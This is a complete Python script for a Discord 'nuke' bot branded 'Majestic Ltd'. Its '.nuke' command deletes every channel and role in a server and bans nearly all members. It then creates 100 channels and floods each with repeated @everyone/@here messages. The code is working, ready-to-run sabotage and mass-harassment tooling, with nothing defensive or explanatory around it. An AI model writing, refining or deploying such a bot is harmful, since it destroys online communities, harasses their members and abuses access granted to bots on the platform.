import discord
from discord.ext import commands
import asyncio
import pyfiglet

BOT_TOKEN = "YOUR_BOT_TOKEN"

bot = commands.Bot(command_prefix=".", intents=discord.Intents.all())

whitelisted_users = [
    123456789012345678,  
    987654321098765432,  
]

semaphore = asyncio.Semaphore(50)

@bot.event
async def on_ready():
    ascii_art = pyfiglet.figlet_format("Majestic Ltd")
    print(ascii_art)
    print(f"Bot is ready! Logged in as {bot.user}")

@bot.command(name="nuke")
async def nuke(ctx, custom_message: str = "This channel has been nuked by Majestic Ltd. @everyone @here"):
    print("Starting the nuke process...")

    if not ctx.guild.me.guild_permissions.manage_channels:
        print("Missing permission: MANAGE_CHANNELS")
        return
    if not ctx.guild.me.guild_permissions.manage_roles:
        print("Missing permission: MANAGE_ROLES")
        return
    if not ctx.guild.me.guild_permissions.ban_members:
        print("Missing permission: BAN_MEMBERS")
        return

    # Step 1: Delete all channels and verify
    print("Step 1: Deleting all channels...")
    await delete_all_channels(ctx)
    await asyncio.sleep(2)  # Wait before verification
    await verify_channels_deleted(ctx)

    # Step 2: Delete all roles and verify
    print("Step 2: Deleting all roles...")
    await delete_all_roles(ctx)
    await asyncio.sleep(2)  # Wait before verification
    await verify_roles_deleted(ctx)

    # Step 3: Ban all members and verify
    print("Step 3: Banning all members...")
    await ban_all_members(ctx)
    await asyncio.sleep(2)  # Wait before verification
    await verify_members_banned(ctx)

    # Step 4: Create new channels
    print("Step 4: Creating new channels...")
    await create_nuked_channels(ctx, custom_message)

    print("✅ Nuke process completed successfully!")

async def delete_all_channels(ctx):
    for channel in ctx.guild.channels:
        if channel.permissions_for(ctx.guild.me).manage_channels:
            try:
                await channel.delete()
                print(f"Deleted channel: {channel.name}")
                await asyncio.sleep(0.1)  # Slow down deletions
            except Exception as e:
                print(f"⚠️ Failed to delete {channel.name}: {e}")

async def delete_all_roles(ctx):
    for role in ctx.guild.roles:
        if role != ctx.guild.default_role and not role.managed and ctx.guild.me.top_role > role:
            try:
                await role.delete()
                print(f"Deleted role: {role.name}")
                await asyncio.sleep(0.1)  # Slow down deletions
            except Exception as e:
                print(f"⚠️ Failed to delete {role.name}: {e}")

async def ban_all_members(ctx):
    for member in ctx.guild.members:
        if member != ctx.guild.owner and not member.bot and member.id not in whitelisted_users and ctx.guild.me.top_role > member.top_role:
            try:
                await member.ban(reason="Nuked by Majestic Ltd.")
                print(f"Banned: {member.name}")
                await asyncio.sleep(0.1)  # Slow down bans
            except Exception as e:
                print(f"⚠️ Failed to ban {member.name}: {e}")

async def create_nuked_channels(ctx, custom_message):
    for i in range(100):
        try:
            new_channel = await ctx.guild.create_text_channel(f"nuked-by-majestic-{i+1}")
            print(f"Created channel {new_channel.name}")
            await asyncio.sleep(0.1)  # Slow down creations
            await send_messages_in_channel(new_channel, custom_message)
        except Exception as e:
            print(f"⚠️ Failed to create channel {i+1}: {e}")

async def send_messages_in_channel(channel, custom_message):
    for _ in range(10):
        try:
            await channel.send(custom_message)
            await asyncio.sleep(0.1)  # Slow down messages
        except Exception as e:
            print(f"⚠️ Failed to send message in {channel.name}: {e}")

async def verify_channels_deleted(ctx):
    remaining_channels = len(ctx.guild.channels)
    if remaining_channels == 0:
        print("✅ All channels deleted successfully.")
    else:
        print(f"❌ {remaining_channels} channels still exist.")

async def verify_roles_deleted(ctx):
    remaining_roles = [role for role in ctx.guild.roles if role != ctx.guild.default_role and not role.managed]
    if not remaining_roles:
        print("✅ All roles deleted successfully.")
    else:
        print(f"❌ {len(remaining_roles)} roles still exist.")

async def verify_members_banned(ctx):
    remaining_members = [member for member in ctx.guild.members if member != ctx.guild.owner and not member.bot and member.id not in whitelisted_users]
    if not remaining_members:
        print("✅ All targeted members banned successfully.")
    else:
        print(f"❌ {len(remaining_members)} members still exist.")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandInvokeError):
        pass
    else:
        raise error

bot.run(BOT_TOKEN)
